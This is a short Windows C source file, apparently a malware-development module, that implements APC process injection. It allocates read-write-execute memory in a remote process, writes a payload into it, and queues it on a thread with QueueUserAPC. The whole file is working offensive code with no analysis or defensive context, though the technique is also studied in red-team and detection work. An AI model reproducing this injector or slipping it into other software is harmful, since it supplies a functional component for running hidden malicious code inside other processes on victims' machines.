#include "PayloadInjection.h"
#include <stdio.h>
#include <windows.h>

LPVOID InjectPayload(HANDLE hProcess, LPVOID lpPayload, SIZE_T payloadSize) {
    LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (lpBaseAddress == NULL) {
        printf("[!] VirtualAllocEx Failed with Error: %d\n", GetLastError());
        return NULL;
    }

    if (!WriteProcessMemory(hProcess, lpBaseAddress, lpPayload, payloadSize, NULL)) {
        printf("[!] WriteProcessMemory Failed with Error: %d\n", GetLastError());
        return NULL;
    }

    return lpBaseAddress;  // Return the base address where the payload is injected
}

BOOL QueuePayloadAPC(HANDLE hThread, LPVOID lpPayloadBase) {
    if (QueueUserAPC((PAPCFUNC)lpPayloadBase, hThread, 0) == 0) {
        printf("[!] QueueUserAPC Failed with Error: %d\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}
